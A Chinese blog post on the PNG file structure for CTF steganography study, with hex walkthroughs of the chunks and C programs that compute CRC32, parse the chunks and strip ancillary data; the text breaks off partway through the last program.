<p>那么可能有人会问，不是还有32位的么，现在最大只有24位啊。这里就补充一下。如果存在第四个字节，则表示该图像表示alpha通道。尽管alpha通道只是一个透明通道，从图像学来说意义不大。然而这种32位元的图像却在桌面时代大行其道。因为有了阿尔法通道，在屏幕上描绘半透明图像变得简单，（这往往是对绘图硬件加速设备的要求）在电脑桌面上能更为轻而易举地实现半透明窗口、菜单渐隐和阴影等效果。</p>
<p>虽然阿尔法通道对于显示缓冲来说没有意义，但是在现实系统中仍然使用着32位元真彩色，这是因为在32位的图中对于像素的寻址更加容易。对24位像素寻址需要乘以3，这样比通过移位就可以实现的乘以4的计算量更大。</p>
]]></content>
      
        <categories>
            
            <category> 图像处理方式 存储结构 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PNG在隐写中的应用]]></title>
      <url>/2017/10/29/PNG%E5%9C%A8%E9%9A%90%E5%86%99%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>让我们一起来了解一下png图片的构成吧～知其然亦知其所以然</p>
<a id="more"></a>
<h2 id="00X0-前言"><a href="#00X0-前言" class="headerlink" title="00X0-前言"></a>00X0-前言</h2><p>其实是在研究隐写术的时候遇到了瓶颈，所以决定去系统的了解一下png的文件格式做一个总结，到这个阶段的隐写术不可能是单纯的三板斧解决的问题，以前为了做题总是将工具当作了主导，其实这样是不对的。工具只能起一部分的分析作用，自身的知识储备才是最重要的部分，否则始终都只是一个<code>script kid</code>。在这里向道哥致敬～</p>
<h2 id="0X01-PNG文件格式"><a href="#0X01-PNG文件格式" class="headerlink" title="0X01-PNG文件格式"></a>0X01-PNG文件格式</h2><p><strong>1、PNG文件署名域</strong></p>
<p>前8字节</p>
<p>固定格式，16进制为： 89 504e 47 0d 0a 1a 0a</p>
<p><strong>2、数据块</strong></p>
<p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>
<p>Chunk Data(数据块数据): 可变长度,存储数据</p>
<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>
<p>数据块类型：</p>
<p><strong>1. 关键数据块(criticalchunk)</strong></p>
<p>(1) 文件头数据块IHDR(headerchunk) - 包含PNG文件的基本信息 - 一个PNG数据流中只能有一个IHDR - 必须在PNG文件最前面</p>
<p>(2) 调色板数据块PLTE(palettechunk) - 包含有与索引彩色图像(indexed-color image)相关的彩色变换数据 - 必须在IDAT之前</p>
<p>(3) 图像数据块IDAT(imagedata chunk) - 存储实际的数据 - 可存在多个 -必须与其他IDAT连续</p>
<p>(4) 图像结束数据IEND(imagetrailer chunk) - 固定格式，16进制为： 0000 00 00 49 45 4E 44 AE 42 60 82 - 必须在PNG文件最尾部</p>
<p><strong>2. 辅助数据块(ancillarychunk)</strong></p>
<p>用于辅助指示PNG图像中的层、文字等信息</p>
<p>可删除，不影响图片浏览，但图像将失去原来的可编辑性</p>
<p>(1) 背景颜色数据块bKGD(backgroundcolor)</p>
<p>(2) 基色和白色度数据块cHRM(primarychromaticities and white point)</p>
<p>(3) 图像γ数据块gAMA(image gamma)</p>
<p>(4) 图像直方图数据块hIST(imagehistogram)</p>
<p>(5) 物理像素尺寸数据块pHYs(physicalpixel dimensions)</p>
<p>(6) 样本有效位数据块sBIT(significantbits)</p>
<p>(7) 文本信息数据块tEXt(textualdata)</p>
<p>(8) 图像最后修改时间数据块tIME(image last-modification time)</p>
<p>(9) 图像透明数据块tRNS(transparency)</p>
<p>(10) 压缩文本数据块zTXt(compressed textual data)</p>
<h2 id="0x02-实例图片分析"><a href="#0x02-实例图片分析" class="headerlink" title="0x02-实例图片分析"></a>0x02-实例图片分析</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png" alt="屏幕快照 2017-10-29 下午2.36.18.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.36.18.png</p>
            </figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.37.29.png" alt="屏幕快照 2017-10-29 下午2.37.29.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.37.29.png</p>
            </figure>
<ol>
<li>png文件署名域</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//固定格式</span></div><div class="line"><span class="number">89</span> <span class="number">50</span> <span class="number">4</span>e <span class="number">47</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">1</span>a <span class="number">0</span>a</div></pre></td></tr></table></figure>
<p>据块结构：</p>
<p>Length: 00 00 00 0D</p>
<p>前4字节，定义长度，00 00 000D十进制为13，代表长度为13个字节</p>
<p>Chunk Type Code： 4948 44 52</p>
<p>4字节，定义数据块类型码，此处为IHDR</p>
<p>Chunk Data： 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>共13字节，定义数据内容</p>
<p>CRC： 4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
<p>即对以下十六进制作计算： 49 48 44 52 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>我们可以编写程序对CRC算法进行一次验证；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">char</span>* InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span>  Crc32Table[<span class="number">256</span>];     </div><div class="line"> <span class="keyword">int</span> i,j;        </div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">            Crc= i;        </div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">              <span class="keyword">if</span> (Crc &amp; <span class="number">1</span>)        </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">              <span class="keyword">else</span>      </div><div class="line">                        Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">            &#125;        </div><div class="line">            Crc32Table[i]= Crc;        </div><div class="line"> &#125;        </div><div class="line"> Crc=<span class="number">0xffffffff</span>;        </div><div class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">            Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line"> 	&#125;     </div><div class="line"> 	Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line"> 	<span class="keyword">return</span> Crc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            <span class="keyword">char</span> buf[<span class="number">17</span>]=&#123;<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x52</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>&#125;;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=GetCrc32(buf,<span class="keyword">sizeof</span>(buf));</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%08X\n"</span>,crc32);</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行程序之后发现算出来的CRC校验准确无误，那么从这里我们就可以想到就算是在，Unix/linux系统上修改了图片的宽高之后与CRC校验不符，也可以通过这种方a式来修改CRC校验，hhh，那么就不需要该死的windows了。</p>
<p><strong>(2) gAMA</strong></p>
<blockquote>
<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B18F 0B FC 61 05 </p>
<p>….gAMA..睆.黙.</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 04</p>
<p>Chunk Type Code： 6741 4D 41</p>
<p>Chunk Data： 00 00B1 8F</p>
<p>CRC： 0B FC 61 05</p>
<p><strong>(3) cHRM</strong></p>
<blockquote>
<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A26 00 00 80 84 ; … cHRM..z&amp;..€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 7530 00 00 EA 60 </p>
<p>..?..€?.u0..阘 00000051h: 00 00 3A 9800 00 17 70 9C BA 51 3C ; ..:?..p満Q&lt;</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 20</p>
<p>Chunk Type Code： 6348 52 4D</p>
<p>Chunk Data： 00 007A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 9800 00 17 70</p>
<p>CRC： 9C BA 51 3C</p>
<p><strong>(4) IDAT</strong></p>
<p><strong>(5-14) tEXt</strong></p>
<p><strong>(15)IEND</strong></p>
<p>数据块结构：</p>
<p>Length: 00 00 00 00</p>
<p>Chunk Type Code： 4945 4E 44</p>
<p>Chunk Data：</p>
<p>CRC： AE 42 60 82</p>
<p>固定结构，CRC的值为对ChunkType Code作CRC32校验</p>
<h2 id="0x03-编写程序分析文件格式"><a href="#0x03-编写程序分析文件格式" class="headerlink" title="0x03-编写程序分析文件格式"></a>0x03-编写程序分析文件格式</h2><p>开发工具：vc6.0、dev-c++、codeblocks</p>
<ol>
<li>读取PNG文件</li>
</ol>
<p>保存为example2.cpp，代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE *fp;   </div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;   </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            <span class="keyword">int</span> len=ftell(fp);</div><div class="line">            unsignedchar *buf=<span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[len];      </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"len=%d\n"</span>,len);</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)</div><div class="line">            &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"%02X"</span>,buf[i<span class="number">-1</span>]);</div><div class="line">                        <span class="keyword">if</span>(i%<span class="number">16</span>==<span class="number">0</span>)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">            &#125;</div><div class="line">            fclose(fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.56.48.png" alt="屏幕快照 2017-10-29 下午2.56.48.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.56.48.png</p>
            </figure>
<ol>
<li>解析数据块结构</li>
</ol>
<p>从第8字节开始，读前四字节为ChunkLength</p>
<p>对应的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> intChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div></pre></td></tr></table></figure>
<p>接着四字节为ChunkName</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"ChunkName:%c%c%c%c\n"</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>然后根据ChunkLength读出完整的ChunkData</p>
<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
<p>保存为check.cpp,完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                        Crc= i;        </div><div class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                    <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                                Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                    <span class="keyword">else</span>       </div><div class="line">                                                Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                        &#125;        </div><div class="line">                        Crc32Table[i]= Crc;        </div><div class="line">            &#125;        </div><div class="line">            Crc=<span class="number">0xffffffff</span>;        </div><div class="line">            <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line">            &#125;     </div><div class="line">            Crc ^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">            returnCrc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE*fp;   </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;   </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            len=ftell(fp);</div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">            fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">            ChunkOffset=<span class="number">8</span>;</div><div class="line">            i=<span class="number">0</span>;</div><div class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                        i++;</div><div class="line">                        <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                        <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkLen: %10d              \n"</span>,ChunkLen);</div><div class="line">                        ChunkOffset+=ChunkLen+<span class="number">12</span>;</div><div class="line">                        crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);</div><div class="line">                        <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                        ChunkLen=ftell(fp);</div><div class="line">                        <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                        </div><div class="line">                                    <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">            &#125;</div><div class="line">            fclose(fp);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行如图，可获得完整的PNG文件结构:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.58.01.png" alt="屏幕快照 2017-10-29 下午2.58.01.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.58.01.png</p>
            </figure>
<p>注：这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
<h2 id="0x04-去除多余数据"><a href="#0x04-去除多余数据" class="headerlink" title="0x04-去除多余数据"></a>0x04-去除多余数据</h2><p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Editor去除辅助数据块gAMA、cHRM和bKGD</p>
<p>文件大小变化，但不影响PNG文件浏览</p>
<ol>
<li>程序实现</li>
</ol>
<p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
<p>保存为compress.cpp,完整代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(unsignedchar*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">           <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                       Crc= i;        </div><div class="line">                       <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                   <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                               Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                   <span class="keyword">else</span>       </div><div class="line">                                               Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                       &#125;        </div><div class="line">                       Crc32Table[i]= Crc;        </div><div class="line">           &#125;        </div><div class="line">           Crc=<span class="number">0xffffffff</span>;        </div><div class="line">           <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;         </div><div class="line">                       Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^InStr[m]];        </div><div class="line">           &#125;     </div><div class="line">           Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">           <span class="keyword">return</span> Crc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">           FILE *fp,*fpnew;   </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> Signature[<span class="number">8</span>]=&#123;<span class="number">0x89</span>,<span class="number">0x50</span>,<span class="number">0x4e</span>,<span class="number">0x47</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span>,<span class="number">0x0a</span>&#125;;         </div><div class="line">           <span 